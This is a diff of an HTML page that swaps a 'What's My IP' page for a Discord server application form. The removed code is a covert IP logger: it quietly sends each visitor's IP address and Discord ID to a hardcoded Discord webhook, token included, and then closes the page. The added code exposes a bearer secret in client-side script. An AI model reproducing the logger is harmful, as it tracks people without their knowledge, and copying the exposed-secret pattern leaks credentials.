@@ -3,51 +3,116 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>What's My IP</title>
+  <title>Application Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      margin-top: 50px;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f9;
+      color: #333;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 20px;
+      background: #fff;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color: #4CAF50;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      margin: 10px 0 5px;
+      font-weight: bold;
+    }
+
+    input, textarea, select, button {
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #45a049;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h1>User Application Form</h1>
+    <form id="applicationForm">
+      <label for="discordID">Discord ID:</label>
+      <input type="text" id="discordID" name="discordID" required>
+
+      <label for="question1">What is your favorite game?</label>
+      <input type="text" id="question1" name="question1" required>
+
+      <label for="question2">Why do you want to join?</label>
+      <textarea id="question2" name="question2" rows="4" required></textarea>
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
   <script>
-    // Replace this with your Discord webhook URL
-    const webhookURL = 'https://discord.com/api/webhooks/1272569229044092948/pOYMbeqEFhUVrot8uP7c27SjHGLzgiM0JG0qwKHVfKhv3TmQ-ctkfyGlKyieyu00inC1';
+    // Replace this with your server-side endpoint URL for the webhook
+    const serverEndpoint = 'https://radientwhitelist.netlify.app';
 
-    // Prompt the user for their Discord ID
-    const discordID = prompt("Please enter your Discord ID:");
+    document.getElementById('applicationForm').addEventListener('submit', function(event) {
+      event.preventDefault();
 
-    if (discordID) {
-      // Fetch the IP address from the API
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          // Send the IP address and Discord ID to the webhook
-          fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              content: `User IP Address: ${data.ip}\nDiscord ID: ${discordID}`
-            })
-          }).then(() => {
-            // Attempt to close the site
-            window.open('', '_self', '');
-            window.close();
-          }).catch(error => {
-            console.error('Error sending to webhook:', error);
-          });
-        })
-        .catch(error => {
-          console.error('Error fetching IP:', error);
+      const discordID = document.getElementById('discordID').value;
+      const question1 = document.getElementById('question1').value;
+      const question2 = document.getElementById('question2').value;
+
+      if (window.location.hostname === 'radientwhitelist.netlify.app') {
+        fetch(serverEndpoint, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer 506486p5dkjgu485ogk467SG%#' // Add a secret key for protection
+          },
+          body: JSON.stringify({
+            discordID: discordID,
+            answers: {
+              favoriteGame: question1,
+              joinReason: question2
+            }
+          })
+        }).then(response => {
+          if (response.ok) {
+            alert('Your application has been submitted successfully!');
+          } else {
+            alert('Failed to submit application. Please try again later.');
+          }
+        }).catch(error => {
+          console.error('Error:', error);
         });
-    } else {
-      alert("Discord ID is required to proceed.");
-    }
+      } else {
+        alert("This form can only be used on radientwhitelist.netlify.app.");
+      }
+    });
   </script>
 </body>
 </html>
